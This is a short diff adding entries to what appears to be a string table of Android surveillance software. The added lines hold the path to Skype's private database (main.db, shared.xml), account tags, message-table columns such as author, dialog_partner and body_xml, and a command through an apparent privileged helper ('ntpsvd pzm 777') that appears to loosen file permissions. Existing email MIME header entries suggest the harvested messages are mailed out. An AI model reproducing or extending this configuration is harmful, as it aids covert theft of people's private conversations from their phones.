@@ -378,3 +378,15 @@ j_16=Content-Type: multipart/alternative; boundary=
 j_17=Content-type: text/plain; charset=UTF8
 j_18=Content-type: text/html; charset=UTF8
 j_19=Content-Transfer-Encoding: quoted-printable
+k_0=/data/data/com.skype.raider/files
+k_1=/main.db
+k_2=/shared.xml
+k_3=<Account>
+k_4=<Default>
+k_5=</Default>
+k_6=/system/bin/ntpsvd pzm 777 
+k_7=Messages
+k_8=id
+k_9=author
+k_10=dialog_partner
+k_11=body_xml
